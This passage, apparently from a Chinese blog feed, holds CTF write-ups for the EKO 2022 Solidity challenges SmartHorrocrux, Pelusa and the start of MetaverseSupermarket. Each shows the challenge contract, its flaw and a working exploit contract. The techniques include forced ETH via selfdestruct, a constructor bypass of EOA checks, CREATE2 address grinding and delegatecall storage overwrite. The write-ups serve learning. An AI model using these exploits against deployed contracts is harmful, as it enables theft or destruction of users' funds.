class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deploy</span>(<span class="params">address</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">address[] memory ret</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value == <span class="number">2</span>, <span class="string">"Pay me 2 wei"</span>);</span><br><span class="line">    address _challenge = address(<span class="keyword">new</span> SmartHorrocrux&#123;<span class="attr">value</span>: <span class="number">2</span>&#125;());</span><br><span class="line">    ret = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">    ret[<span class="number">0</span>] = _challenge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params">address[] calldata _challenges</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// @dev to win this challenge you must detroy the contract</span></span><br><span class="line">    address _contract = _challenges[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    uint256 size;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        size := extcodesize(_contract)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然哈，就是要让合约自毁，那我们就来看看有哪些判断要通过呗。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroyIt</span>(<span class="params">string memory spell, uint256 magic</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    bytes32 spellInBytes;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        spellInBytes := mload(add(spell, <span class="number">32</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">require</span>(spellInBytes == _spell, <span class="string">"That spell wouldn't kill a fly"</span>);</span><br><span class="line">    <span class="built_in">require</span>(!invincible, <span class="string">"The Horrocrux is still invincible"</span>);</span><br><span class="line"></span><br><span class="line">    bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic)));</span><br><span class="line">    address(<span class="keyword">this</span>).call(kedavra);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的前三行其实就是把string转换成了bytes32，不用过多纠结。</p><p>第一个require就是要我们传入的spell和它的_spell相等，那我们构造一下就行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bytes32 spellInBytes = bytes32(<span class="number">0x45746865724b6164616272610000000000000000000000000000000000000000</span>);</span><br><span class="line">string memory spell = string(abi.encodePacked(spellInBytes));</span><br></pre></td></tr></table></figure><p>第二个require要invincible为false，魂器要被销毁才是重点，我们可以看到<code>setInvincible</code>是可以修改的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setInvincible</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        invincible = (address(<span class="keyword">this</span>).balance == <span class="number">1</span>) ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求当前合约的余额为0，但初始化为2，并且falback函数如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fallback() external &#123;</span><br><span class="line">    uint256 b = address(<span class="keyword">this</span>).balance;</span><br><span class="line">    invincible = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    tx.origin.call&#123;<span class="attr">value</span>: b&#125;(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们可以通过调用一个fallback，使合约余额为0，最后创建一个有1wei的新合约自毁来达到给这个合约硬塞ETH的目的。</p><p>最后的最后构造一下<code>destroyIt</code>的调用data即可。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;SmartHorrocrux.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SmartHorrocruxAttack &#123;</span><br><span class="line">    SmartHorrocrux public sh;</span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        sh &#x3D; SmartHorrocrux(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        sh.setInvincible();</span><br><span class="line">        bytes32 spellInBytes &#x3D; bytes32(0x45746865724b6164616272610000000000000000000000000000000000000000);</span><br><span class="line"></span><br><span class="line">        string memory spell &#x3D; string(abi.encodePacked(spellInBytes));</span><br><span class="line">        bytes32 selector &#x3D; bytes32(abi.encodeWithSignature(&quot;kill()&quot;));</span><br><span class="line">        uint256 magic &#x3D; uint256(spellInBytes) - uint256(selector);</span><br><span class="line">        </span><br><span class="line">        sh.destroyIt(spell, magic);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract destruct&#123;</span><br><span class="line">    constructor(address payable _target) public payable &#123;</span><br><span class="line">        _target.call(&quot;&quot;);</span><br><span class="line">        selfdestruct(_target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> EKO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EKO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-EKO-Pelusa</title>
      <link href="/EKO-Pelusa/"/>
      <url>/EKO-Pelusa/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-EKO-Pelusa"><a href="#CTF-EKO-Pelusa" class="headerlink" title="CTF-EKO-Pelusa"></a>CTF-EKO-Pelusa</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>先来看题目描述：</p><blockquote><p>你只要睁开眼睛，就在 1986 年的墨西哥，帮助迭戈将比分从 1 比 2 定为胜利，做任何必要的事情！</p></blockquote><p>好吧，题目没有有价值的提示，只知道我们需要修改一个比分？</p><p>来看合约：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line">interface IGame &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getBallPossesion</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// "<span class="title">el</span> <span class="title">baile</span> <span class="title">de</span> <span class="title">la</span> <span class="title">gambeta</span>"</span></span><br><span class="line"><span class="function">// <span class="title">https</span>://<span class="title">www</span>.<span class="title">youtube</span>.<span class="title">com</span>/<span class="title">watch</span>?<span class="title">v</span>=<span class="title">qzxn85zX2aE</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/// @<span class="title">title</span> <span class="title">Pelusa</span></span></span><br><span class="line"><span class="function">/// @<span class="title">author</span> <span class="title">https</span>://<span class="title">twitter</span>.<span class="title">com</span>/<span class="title">eugenioclrc</span></span></span><br><span class="line"><span class="function">/// @<span class="title">notice</span> <span class="title">Its</span> 1986, <span class="title">you</span> <span class="title">are</span> <span class="title">in</span> <span class="title">the</span> <span class="title">football</span> <span class="title">world</span> <span class="title">cup</span> (<span class="params">Mexico86</span>), <span class="title">help</span> <span class="title">Diego</span> <span class="title">score</span> <span class="title">a</span> <span class="title">goal</span>.</span></span><br><span class="line"><span class="function">/// @<span class="title">custom</span>:<span class="title">url</span> <span class="title">https</span>://<span class="title">www</span>.<span class="title">ctfprotocol</span>.<span class="title">com</span>/<span class="title">tracks</span>/<span class="title">eko2022</span>/<span class="title">pelusa</span></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Pelusa</span> </span>&#123;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    address internal player;</span><br><span class="line"></span><br><span class="line">    uint256 public goals = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">passTheBall</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.code.length == <span class="number">0</span>, <span class="string">"Only EOA players"</span>);</span><br><span class="line">        <span class="comment">/// @dev "la pelota siempre al 10"</span></span><br><span class="line">        <span class="built_in">require</span>(uint256(uint160(msg.sender)) % <span class="number">100</span> == <span class="number">10</span>, <span class="string">"not allowed"</span>);</span><br><span class="line"></span><br><span class="line">        player = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isGoal</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// expect ball in owners posession</span></span><br><span class="line">        <span class="keyword">return</span> IGame(player).getBallPossesion() == owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">shoot</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(isGoal(), <span class="string">"missed"</span>);</span><br><span class="line">        <span class="comment">/// @dev use "the hand of god" trick</span></span><br><span class="line">        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(<span class="string">"handOfGod()"</span>));</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">"missed"</span>);</span><br><span class="line">        <span class="built_in">require</span>(uint256(bytes32(data)) == <span class="number">22</span>_06_1986);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合约代码很少，<code>passTheBall</code>函数看起来限制了非EOA账户的调用，然后又对调用者的地址做了一个苛刻的判断。由于不能用合约调用，我们常用的create2跑靓号的解决方案行不通，那这个题看似无解？</p><p>但是…让我们来回想一下，Uniswap限制非EOA账户调用的方式是什么:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function isContract(address addr) internal view returns (bool) &#123;</span><br><span class="line">    uint256 size;</span><br><span class="line">    assembly &#123; size :&#x3D; extcodesize(addr) &#125;</span><br><span class="line">    return size &gt; 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>通常是通过<code>extcodesize</code>这个操作码来返回地址相关代码量的大小，大于0则是合约账户。</p><p>那么题目中的<code>require(msg.sender.code.length == 0, &quot;Only EOA players&quot;);</code>和<code>extcodesize</code>有什么区别呢</p><p><code>address.code</code>是evm在创建合约之后的runtimecode，而合约的构造函数，正是在创建合约时运行的。</p><p>换句话说，在构造函数运行的时候，合约还没有被创建完成，runtimecode还没有被evm生成，<code>address.code</code>的值仍然为0。</p><p><code>passTheBall()</code>将player成功赋值后，才真正进入challange，老规矩先看看Factory吧:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deploy</span>(<span class="params">address</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">address[] memory ret</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value == <span class="number">0</span>, <span class="string">"dont send ether"</span>);</span><br><span class="line">    address _challenge = address(<span class="keyword">new</span> Pelusa());</span><br><span class="line">    ret = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">    ret[<span class="number">0</span>] = _challenge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params">address[] calldata _challenges</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// @dev to win this challenge you must drain the contract</span></span><br><span class="line">    Pelusa _target = Pelusa(_challenges[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _target.goals() == <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来目的是修改goals为2。</p><p>但是在此合约中没有关于goals的赋值语句，那这个题反而变简单了。因为目前想要解题，几乎只有delegatecall这一种方式，很快我们就锁定了<code>shoot</code>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shoot</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(isGoal(), <span class="string">"missed"</span>);</span><br><span class="line">        <span class="comment">/// @dev use "the hand of god" trick</span></span><br><span class="line">        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(<span class="string">"handOfGod()"</span>));</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">"missed"</span>);</span><br><span class="line">        <span class="built_in">require</span>(uint256(bytes32(data)) == <span class="number">22</span>_06_1986);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个判断<code>isGoal</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function isGoal() public view returns (bool) &#123;</span><br><span class="line">        &#x2F;&#x2F; expect ball in owners posession</span><br><span class="line">        return IGame(player).getBallPossesion() &#x3D;&#x3D; owner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想通过这个判断，其实就是要获取owner的值，值得一提的是这个变量还没法通过web3.getStorageAt去获取，因为被声明为<code>immutable</code>的变量保存在initcode里面，那这里其实是可以通过查看合约部署时属于哪个区块，照着样子abi编码即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))))</span><br></pre></td></tr></table></figure><p>之后就进入到我们的delegatecall了，这里过于基础，就不讲了，相关内容可以移步<a href="https://thomasxu-blockchain.github.io/delegatecall/">https://thomasxu-blockchain.github.io/delegatecall/</a></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../ChallengePelusa.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract PelusaDeployer &#123;</span><br><span class="line">    ChallengePelusaAttacker public attacker;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address target) &#123;</span><br><span class="line">        bytes32 salt = calculateSalt(target);</span><br><span class="line">        attacker = <span class="keyword">new</span> ChallengePelusaAttacker&#123; <span class="attr">salt</span>: bytes32(salt) &#125;(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">calculateSalt</span>(<span class="params">address target</span>) <span class="title">private</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bytes32</span>) </span>&#123;</span><br><span class="line">        uint256 salt = <span class="number">0</span>;</span><br><span class="line">        bytes32 initHash = keccak256(abi.encodePacked(type(ChallengePelusaAttacker).creationCode, abi.encode(target)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            bytes32 hash = keccak256(abi.encodePacked(bytes1(<span class="number">0xff</span>), address(<span class="keyword">this</span>), bytes32(salt), initHash));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (uint160(uint256(hash)) % <span class="number">100</span> == <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            salt += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bytes32(salt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ChallengePelusaAttacker is IGame &#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    uint256 public goals;</span><br><span class="line"></span><br><span class="line">    Pelusa private pelusa;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address _target) &#123;</span><br><span class="line">        pelusa = Pelusa(_target);</span><br><span class="line">        pelusa.passTheBall();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params">address _deployer</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="comment">//这里把0换成Pelusa合约部署时的区块号即可</span></span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(_deployer, bytes32(uint256(<span class="number">0</span>)))))));</span><br><span class="line">        pelusa.shoot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getBallPossesion</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handOfGod</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        goals = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22</span>_06_1986;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> EKO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EKO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-EKO-MetaverseSupermarket</title>
      <link href="/EKO-MetaverseSupermarket/"/>
      <url>/EKO-MetaverseSupermarket/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-EKO-MetaverseSupermarket"><a href="#CTF-EKO-MetaverseSupermarket" class="headerlink" title="CTF-EKO-MetaverseSupermarket"></a>CTF-EKO-MetaverseSupermarket</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>这个CTF的难度好像普遍不是很难，我会保持一天更新一篇。</p><p>先来看题目描述：</p><blockquote><p>我们都生活在 Inflation Metaverse 中，这是一个由 INFLA 代币主导的数字世界。稳定性已经成为一种稀缺资源，甚至去商店都是一种痛苦的经历：我们需要依赖预言机来签署持续几个区块的链下数据，因为在链上更新价格将是完全疯狂的。<br>你离开了 INFLA，你正在挨饿，你能打败这个系统吗？</p></blockquote><p>看起来这个题和价格预言机有关，接下来重点关注预言机部分。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"openzeppelin-contracts/utils/cryptography/EIP712.sol"</span>;</span><br><span class="line"></span><br><span class="line">struct OraclePrice &#123;</span><br><span class="line">    uint256 blockNumber;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32 r;</span><br><span class="line">    bytes32 s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract contract InflaStoreEIP712 is EIP712 &#123;</span><br><span class="line">    bytes32 public constant ORACLE_PRICE_TYPEHASH = keccak256(<span class="string">"OraclePrice(uint256 blockNumber,uint256 price)"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_hashOraclePrice</span>(<span class="params">OraclePrice memory oraclePrice</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bytes32 hash</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _hashTypedDataV4(</span><br><span class="line">            keccak256(abi.encode(ORACLE_PRICE_TYPEHASH, oraclePrice.blockNumber, oraclePrice.price))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// @title Metaverse Supermarket</span></span><br><span class="line"><span class="comment">/// @author https://twitter.com/adrianromero</span></span><br><span class="line"><span class="comment">/// @notice We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. You are out of INFLAs and you are starving, can you defeat the system?</span></span><br><span class="line"><span class="comment">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/metaverse-supermarket</span></span><br><span class="line">contract InflaStore is InflaStoreEIP712 &#123;</span><br><span class="line">    Meal public immutable meal;</span><br><span class="line">    Infla public immutable infla;</span><br><span class="line"></span><br><span class="line">    address private owner;</span><br><span class="line">    address private oracle;</span><br><span class="line"></span><br><span class="line">    uint256 public constant MEAL_PRICE = <span class="number">1e6</span>;</span><br><span class="line">    uint256 public constant BLOCK_RANGE = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address player) EIP712("InflaStore", "1.0") &#123;</span><br><span class="line">        meal = <span class="keyword">new</span> Meal();</span><br><span class="line">        infla = <span class="keyword">new</span> Infla(player, <span class="number">10</span>);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setOracle</span>(<span class="params">address _oracle</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(owner == msg.sender, <span class="string">"!owner"</span>);</span><br><span class="line">        oracle = _oracle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        _mintMeal(msg.sender, MEAL_PRICE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buyUsingOracle</span>(<span class="params">OraclePrice calldata oraclePrice, Signature calldata signature</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        _validateOraclePrice(oraclePrice, signature);</span><br><span class="line">        _mintMeal(msg.sender, 